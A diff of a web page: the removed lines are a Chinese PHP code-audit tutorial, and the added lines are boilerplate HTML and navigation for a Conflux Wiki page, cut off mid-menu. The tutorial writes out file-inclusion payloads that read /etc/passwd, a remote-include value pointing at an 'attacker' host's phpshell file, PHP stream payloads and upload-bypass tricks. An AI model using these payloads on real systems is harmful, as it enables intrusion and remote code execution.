-</code></pre></div> <p>上述代码存在本地文件包含，可用 %00 截断的方式读取 <code>/etc/passwd</code> 文件内容。</p> <ul> <li><code>%00</code> 截断</li> </ul> <div class=highlight><pre><span></span><code>?file=../../../../../../../../../etc/passwd%00
-</code></pre></div> <p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。</p> <ul> <li>路径长度截断</li> </ul> <div class=highlight><pre><span></span><code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
-</code></pre></div> <p>Linux 需要文件名长于 4096，Windows 需要长于 256。</p> <ul> <li>点号截断</li> </ul> <div class=highlight><pre><span></span><code>?file=../../../../../../../../../boot.ini/………[…]…………
-</code></pre></div> <p>只适用 Windows，点号需要长于 256。</p> <h3 id=_3>远程文件包含<a class=headerlink href=#_3 title="Permanent link">&para;</a></h3> <p>远程文件包含，Remote File Inclusion，RFI。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=k>if</span> <span class=p>(</span><span class=nv>$route</span> <span class=o>==</span> <span class=s2>&quot;share&quot;</span><span class=p>)</span> <span class=p>{</span>
-  <span class=k>require_once</span> <span class=nv>$basePath</span> <span class=o>.</span> <span class=s2>&quot;/action/m_share.php&quot;</span><span class=p>;</span>
-<span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$route</span> <span class=o>==</span> <span class=s2>&quot;sharelink&quot;</span><span class=p>)</span> <span class=p>{</span>
-  <span class=k>require_once</span> <span class=nv>$basePath</span> <span class=o>.</span> <span class=s2>&quot;/action/m_sharelink.php&quot;</span><span class=p>;</span>
-<span class=p>}</span>
-</code></pre></div> <p>构造变量 <code>basePath</code> 的值。</p> <div class=highlight><pre><span></span><code>/?basePath=http://attacker/phpshell.txt?
-</code></pre></div> <p>最终的代码执行了</p> <div class=highlight><pre><span></span><code><span class=x>require_once &quot;http://attacker/phpshell.txt?/action/m_share.php&quot;;</span>
-</code></pre></div> <p>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。</p> <ul> <li>普通远程文件包含</li> </ul> <div class=highlight><pre><span></span><code>?file=[http|https|ftp]://example.com/shell.txt
-</code></pre></div> <p>需要 <code>allow_url_fopen=On</code> 并且 <code>allow_url_include=On</code> 。</p> <ul> <li>利用 PHP 流 input</li> </ul> <div class=highlight><pre><span></span><code>?file=php://input
-</code></pre></div> <p>需要 <code>allow_url_include=On</code> 。</p> <ul> <li>利用 PHP 流 filter</li> </ul> <div class=highlight><pre><span></span><code>?file=php://filter/convert.base64-encode/resource=index.php
-</code></pre></div> <p>需要 <code>allow_url_include=On</code> 。</p> <ul> <li>利用 data URIs</li> </ul> <div class=highlight><pre><span></span><code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
-</code></pre></div> <p>需要 <code>allow_url_include=On</code> 。</p> <ul> <li>利用 XSS 执行</li> </ul> <div class=highlight><pre><span></span><code>?file=http://127.0.0.1/path/xss.php?xss=phpcode
-</code></pre></div> <p>需要 <code>allow_url_fopen=On</code>，<code>allow_url_include=On</code> 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。</p> <h2 id=_4>文件上传<a class=headerlink href=#_4 title="Permanent link">&para;</a></h2> <p>文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够被 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。</p> <h3 id=_5>绕过上传检查<a class=headerlink href=#_5 title="Permanent link">&para;</a></h3> <ul> <li>前端检查扩展名</li> </ul> <p>抓包绕过即可。</p> <ul> <li><code>Content-Type</code> 检测文件类型</li> </ul> <p>抓包修改 <code>Content-Type</code> 类型，使其符合白名单规则。</p> <ul> <li>服务端添加后缀</li> </ul> <p>尝试 <code>%00</code> 截断。</p> <ul> <li>服务端扩展名检测</li> </ul> <p>利用解析漏洞。</p> <ul> <li>Apache 解析</li> </ul> <p>Apache 对后缀解析是从右向左的</p> <p><code>phpshell.php.rar.rar.rar.rar</code> 因为 Apache 不认识 <code>.rar</code> 这个文件类型，所以会一直遍历后缀到 <code>.php</code>，然后认为这是一个 PHP 文件。</p> <ul> <li>IIS 解析</li> </ul> <p>IIS 6 下当文件名为 <code>abc.asp;xx.jpg</code> 时，会将其解析为 <code>abc.asp</code>。</p> <ul> <li>PHP CGI 路径解析</li> </ul> <p>当访问 <code>http://www.a.com/path/test.jpg/notexist.php</code> 时，会将 <code>test.jpg</code> 当做 PHP 解析， <code>notexist.php</code> 是不存在的文件。此时 Nginx 的配置如下</p> <div class=highlight><pre><span></span><code><span class=k>location</span> <span class=p>~</span> <span class=sr>\.php$</span> <span class=p>{</span>
-  <span class=kn>root</span> <span class=s>html</span><span class=p>;</span>
-  <span class=kn>fastcgi_pass</span> <span class=n>127.0.0.1</span><span class=p>:</span><span class=mi>9000</span><span class=p>;</span>
-  <span class=kn>fastcgi_index</span> <span class=s>index.php</span><span class=p>;</span>
-  <span class=kn>fastcgi_param</span> <span class=s>SCRIPT_FILENAME</span> <span class=s>/scripts</span><span class=nv>$fastcgi_script_name</span><span class=p>;</span>
-  <span class=kn>include</span> <span class=s>fastcgi_param</span><span class=p>;</span>
-<span class=p>}</span>
-</code></pre></div> <ul> <li>其他方式</li> </ul> <p>后缀大小写、双写、特殊后缀如 <code>php5</code> 等，修改包内容的大小写过 WAF 等。</p> <h2 id=_6>变量覆盖<a class=headerlink href=#_6 title="Permanent link">&para;</a></h2> <h3 id=_7>全局变量覆盖<a class=headerlink href=#_7 title="Permanent link">&para;</a></h3> <p>变量如果未被初始化，且能够被用户所控制，那么很可能会导致安全问题。</p> <div class=highlight><pre><span></span><code><span class=na>register_globals</span><span class=o>=</span><span class=s>ON</span>
-</code></pre></div> <p>示例</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=k>echo</span> <span class=s2>&quot;Register_globals: &quot;</span> <span class=o>.</span> <span class=p>(</span><span class=nx>int</span><span class=p>)</span><span class=nb>ini_get</span><span class=p>(</span><span class=s2>&quot;register_globals&quot;</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&quot;&lt;br/&gt;&quot;</span><span class=p>;</span>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        <meta name="author" content="Conflux Wiki Team">
+        <link rel="canonical" href="https://conflux-wiki.github.io/web/php/php/">
+        <link rel="shortcut icon" href="../../../img/favicon.ico">
+        <title>PHP 代码审计 - Conflux Wiki</title>
+        <link href="../../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css">
+        <link href="../../../static/css/extra.css" rel="stylesheet">
 
-<span class=k>if</span> <span class=p>(</span><span class=nv>$auth</span><span class=p>)</span> <span class=p>{</span>
-  <span class=k>echo</span> <span class=s2>&quot;private!&quot;</span><span class=p>;</span>
-<span class=p>}</span>
-<span class=cp>?&gt;</span><span class=x></span>
-</code></pre></div> <p>当 <code>register_globals=ON</code> 时，提交 <code>test.php?auth=1</code>，<code>auth</code> 变量将自动得到赋值。</p> <h3 id=extract><code>extract()</code> 变量覆盖<a class=headerlink href=#extract title="Permanent link">&para;</a></h3> <p><code>extract()</code> 函数能够将变量从数组导入到当前的符号表，其定义为</p> <div class=highlight><pre><span></span><code>int extract ( array $var_array [, int $extract_type [, string $prefix ]] )
-</code></pre></div> <p>其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是 <code>EXTR_OVERWRITE</code> 和 <code>EXTR_SKIP</code>。</p> <p>当值为 <code>EXTR_OVERWRITE</code> 时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为 <code>EXTR_SKIP</code> 则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用 <code>EXTR_OVERWRITE</code>。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=nv>$auth</span> <span class=o>=</span> <span class=s2>&quot;0&quot;</span><span class=p>;</span>
-<span class=nb>extract</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>);</span>
+        <script src="../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../js/bootstrap.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
 
-<span class=k>if</span> <span class=p>(</span><span class=nv>$auth</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
-  <span class=k>echo</span> <span class=s2>&quot;private!&quot;</span><span class=p>;</span>
-<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-  <span class=k>echo</span> <span class=s2>&quot;public!&quot;</span><span class=p>;</span>
-<span class=p>}</span>
-<span class=cp>?&gt;</span><span class=x></span>
-</code></pre></div> <p>当 <code>extract()</code> 函数从用户可以控制的数组中导出变量时，可能发生变量覆盖。</p> <h3 id=import_request_variables><code>import_request_variables</code> 变量覆盖<a class=headerlink href=#import_request_variables title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>bool import_request_variables (string $types [, string $prefix])
-</code></pre></div> <p><code>import_request_variables</code> 将 GET、POST、Cookies 中的变量导入到全局，使用这个函数只用简单地指定类型即可。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=nv>$auth</span> <span class=o>=</span> <span class=s2>&quot;0&quot;</span><span class=p>;</span>
-<span class=nb>import_request_variables</span><span class=p>(</span><span class=s2>&quot;G&quot;</span><span class=p>);</span>
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../../..">Conflux Wiki</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
 
-<span class=k>if</span> <span class=p>(</span><span class=nv>$auth</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
-  <span class=k>echo</span> <span class=s2>&quot;private!&quot;</span><span class=p>;</span>
-<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-  <span class=k>echo</span> <span class=s2>&quot;public!&quot;</span><span class=p>;</span>
-<span class=p>}</span>
-<span class=cp>?&gt;</span><span class=x></span>
-</code></pre></div> <p><code>import_request_variables("G")</code> 指定导入 GET 请求中的变量，提交 <code>test.php?auth=1</code> 出现变量覆盖。</p> <h3 id=parse_str><code>parse_str()</code> 变量覆盖<a class=headerlink href=#parse_str title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>void parse_str ( string $str [, array &amp;$arr ])
-</code></pre></div> <p><code>parse_str()</code> 函数通常用于解析 URL 中的 querystring，但是当参数值可以被用户控制时，很可能导致变量覆盖。</p> <div class=highlight><pre><span></span><code><span class=x>// var.php?var=new  变量覆盖</span>
-<span class=x>$var = &quot;init&quot;;</span>
-<span class=x>parse_str($_SERVER[&quot;QUERY_STRING&quot;]);</span>
-<span class=x>print $var;</span>
-</code></pre></div> <p>与 <code>parse_str()</code> 类似的函数还有 <code>mb_parse_str()</code>。</p> <h2 id=_8>命令执行<a class=headerlink href=#_8 title="Permanent link">&para;</a></h2> <h3 id=_9>直接执行代码<a class=headerlink href=#_9 title="Permanent link">&para;</a></h3> <p>PHP 中有不少可以直接执行代码的函数。</p> <div class=highlight><pre><span></span><code><span class=x>eval();</span>
-<span class=x>assert();</span>
-<span class=x>system();</span>
-<span class=x>exec();</span>
-<span class=x>shell_exec();</span>
-<span class=x>passthru();</span>
-<span class=x>escapeshellcmd();</span>
-<span class=x>pcntl_exec();</span>
-<span class=x>......</span>
-</code></pre></div> <h3 id=preg_replace><code>preg_replace()</code> 代码执行<a class=headerlink href=#preg_replace title="Permanent link">&para;</a></h3> <p><code>preg_replace()</code> 的第一个参数如果存在 <code>/e</code> 模式修饰符，则允许代码执行。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=nv>$var</span> <span class=o>=</span> <span class=s2>&quot;&lt;tag&gt;phpinfo()&lt;/tag&gt;&quot;</span><span class=p>;</span>
-<span class=nb>preg_replace</span><span class=p>(</span><span class=s2>&quot;/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e&quot;</span><span class=p>,</span> <span class=s2>&quot;addslashes(</span><span class=se>\\</span><span class=s2>1)&quot;</span><span class=p>,</span> <span class=nv>$var</span><span class=p>);</span>
-<span class=cp>?&gt;</span><span class=x></span>
-</code></pre></div> <p>如果没有 <code>/e</code> 修饰符，可以尝试 %00 截断。</p> <h3 id=preg_match><code>preg_match</code> 代码执行<a class=headerlink href=#preg_match title="Permanent link">&para;</a></h3> <p><code>preg_match</code> 执行的是匹配正则表达式，如果匹配成功，则允许代码执行。</p> <div class=highlight><pre><span></span><code>&lt;?php
-include &#39;flag.php&#39;;
-if(isset($_GET[&#39;code&#39;])){
-    $code = $_GET[&#39;code&#39;];
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Start <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../.." class="dropdown-item">简介</a>
+</li>
+                                    
+<li>
+    <a href="../../../usage/" class="dropdown-item">如何使用 Conflux Wiki</a>
+</li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">贡献指南</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../contribute/before-contributing/" class="dropdown-item">贡献之前</a>
+</li>
+            
+<li>
+    <a href="../../../contribute/basic-contribute-approach/" class="dropdown-item">基本贡献方式</a>
+</li>
+            
+<li>
+    <a href="../../../contribute/documentation-requirement/" class="dropdown-item">贡献文档要求</a>
+</li>
+            
+<li>
+    <a href="../../../contribute/translation/" class="dropdown-item">翻译</a>
+</li>
+    </ul>
+  </li>
+                                    
+<li>
+    <a href="../../../discussion/" class="dropdown-item">讨论交流</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Introduction <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../../introduction/history/" class="dropdown-item">区块链 历史</a>
+</li>
+                                    
+<li>
+    <a href="../../../introduction/link/" class="dropdown-item">Conflux相关链接</a>
+</li>
+                                    
+<li>
+    <a href="../../../introduction/highlight-time/" class="dropdown-item">重要时刻</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Crypto <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../../crypto/introduction/" class="dropdown-item">密码学简介</a>
+</li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">基础数学知识</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/basic/introduction/" class="dropdown-item">基础数学知识</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">古典密码</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/classical/introduction/" class="dropdown-item">古典密码简介</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/classical/monoalphabetic/" class="dropdown-item">单表代换加密</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/classical/polyalphabetic/" class="dropdown-item">多表代换加密</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/classical/others/" class="dropdown-item">其它类型加密</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/classical/summary/" class="dropdown-item">总结</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">流密码</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/streamcipher/intro/" class="dropdown-item">流密码</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">伪随机数生成器</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/streamcipher/prng/intro/" class="dropdown-item">伪随机数生成器介绍</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/streamcipher/prng/csprng/" class="dropdown-item">密码安全伪随机数生成器</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/streamcipher/prng/problem/" class="dropdown-item">题目</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">线性同余生成器</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/streamcipher/lcg/intro/" class="dropdown-item">线性同余生成器</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/streamcipher/lcg/challenge/" class="dropdown-item">题目</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">反馈移位寄存器</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/streamcipher/fsr/intro/" class="dropdown-item">反馈移位寄存器</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/streamcipher/fsr/lfsr/" class="dropdown-item">线性反馈移位寄存器 - LFSR</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/streamcipher/fsr/nfsr/" class="dropdown-item">非线性反馈移位寄存器</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">特殊流密码</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/streamcipher/special/rc4/" class="dropdown-item">RC4</a>
+</li>
+    </ul>
+  </li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">块加密</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/blockcipher/introduction/" class="dropdown-item">块加密</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">ARX</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/blockcipher/arx-operations/" class="dropdown-item">ARX: Add-Rotate-Xor</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">DES</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/blockcipher/des/" class="dropdown-item">DES</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">IDEA</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/blockcipher/idea/" class="dropdown-item">IDEA</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">AES</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/blockcipher/aes/" class="dropdown-item">AES</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Simon and Speck</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/blockcipher/simon-speck/" class="dropdown-item">Simon and Speck Block Ciphers</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">分组模式</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/blockcipher/mode/introduction/" class="dropdown-item">分组模式</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/blockcipher/mode/padding/" class="dropdown-item">填充方式</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/blockcipher/mode/ecb/" class="dropdown-item">ECB</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/blockcipher/mode/cbc/" class="dropdown-item">CBC</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/blockcipher/mode/pcbc/" class="dropdown-item">PCBC</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/blockcipher/mode/cfb/" class="dropdown-item">CFB</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/blockcipher/mode/ofb/" class="dropdown-item">OFB</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/blockcipher/mode/ctr/" class="dropdown-item">CTR</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/blockcipher/mode/padding-oracle-attack/" class="dropdown-item">Padding Oracle Attack</a>
+</li>
+    </ul>
+  </li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">非对称加密</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/asymmetric/introduction/" class="dropdown-item">介绍</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">RSA</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/asymmetric/rsa/rsa_theory/" class="dropdown-item">RSA 介绍</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/rsa/rsa_module_attack/" class="dropdown-item">模数相关攻击</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/rsa/rsa_e_attack/" class="dropdown-item">公钥指数相关攻击</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/rsa/rsa_d_attack/" class="dropdown-item">私钥 d 相关攻击</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/rsa/rsa_coppersmith_attack/" class="dropdown-item">Coppersmith 相关攻击</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/" class="dropdown-item">RSA 选择明密文攻击</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/rsa/rsa_side_channel/" class="dropdown-item">RSA 侧信道攻击</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/rsa/rsa_pkcs_attack/" class="dropdown-item">Bleichenbacher's attack</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/rsa/rsa_complex/" class="dropdown-item">RSA 复杂题目</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">背包加密</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/asymmetric/knapsack/knapsack/" class="dropdown-item">背包加密</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">离散对数相关</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/asymmetric/discrete-log/discrete-log/" class="dropdown-item">离散对数</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/discrete-log/elgamal/" class="dropdown-item">ElGamal</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/discrete-log/ecc/" class="dropdown-item">ECC</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">格密码</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/asymmetric/lattice/overview/" class="dropdown-item">格概述</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/lattice/introduction/" class="dropdown-item">基本介绍</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/lattice/lattice-reduction/" class="dropdown-item">格基规约算法</a>
+</li>
+            
+<li>
+    <a href="../../../crypto/asymmetric/lattice/cvp/" class="dropdown-item">CVP</a>
+</li>
+    </ul>
+  </li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">哈希函数</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/hash/introduction/" class="dropdown-item">哈希函数</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">MD5</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/hash/md5/" class="dropdown-item">MD5</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">SHA1</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/hash/sha1/" class="dropdown-item">SHA1</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">FNV</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/hash/fnv/" class="dropdown-item">Fowler–Noll–Vo hash function</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Hash Attack</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/hash/attack/" class="dropdown-item">Hash Attack</a>
+</li>
+    </ul>
+  </li>
+            
+<li>
+    <a href="../../../crypto/hash/complex/" class="dropdown-item">综合题目</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">数字签名</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/signature/introduction/" class="dropdown-item">数字签名</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">RSA 数字签名</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/signature/rsa/" class="dropdown-item">RSA 数字签名</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">ElGamal 数字签名</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/signature/elgamal/" class="dropdown-item">ElGamal</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">DSA 数字签名</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/signature/dsa/" class="dropdown-item">DSA</a>
+</li>
+    </ul>
+  </li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">攻击思想总结</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/attack-summary/attack-mode/" class="dropdown-item">简介</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">中间相遇攻击</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/attack-summary/meet-in-the-middle/" class="dropdown-item">中间相遇攻击 - MITM</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">比特攻击</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/attack-summary/bit-attack/" class="dropdown-item">比特攻击</a>
+</li>
+    </ul>
+  </li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">证书格式</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../crypto/certificate/introduction/" class="dropdown-item">证书格式</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Development <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../../development/introduction/" class="dropdown-item">Conflux应用开发入门</a>
+</li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">生态开发激励</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../development/incentive-guide/" class="dropdown-item">生态激励指南</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">开发工具及相关资源介绍</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../development/tools/" class="dropdown-item">开发工具</a>
+</li>
+            
+<li>
+    <a href="../../../development/resources/" class="dropdown-item">开发资源</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">ConfluxScan教程</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../development/apply-contract-fee/" class="dropdown-item">为合约申请Conflux赞助额度（合约代付）</a>
+</li>
+            
+<li>
+    <a href="../../../development/address-NFT/" class="dropdown-item">NFT查看器教程</a>
+</li>
+            
+<li>
+    <a href="../../../development/register-contract-and-token-display/" class="dropdown-item">如何在Scan上注册合约和代币展示</a>
+</li>
+            
+<li>
+    <a href="../../../development/get-lp-token-address/" class="dropdown-item">查找LP代币的合约地址</a>
+</li>
+            
+<li>
+    <a href="../../../development/internal-transaction/" class="dropdown-item">交易分析</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Portal钱包教程</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../development/portal/" class="dropdown-item">Portal安装配置步骤</a>
+</li>
+            
+<li>
+    <a href="../../../development/portal-setting/" class="dropdown-item">Portal钱包常用功能解析</a>
+</li>
+            
+<li>
+    <a href="../../../development/add-token-to-portal/" class="dropdown-item">添加CRC20代币到Portal的方法与步骤</a>
+</li>
+            
+<li>
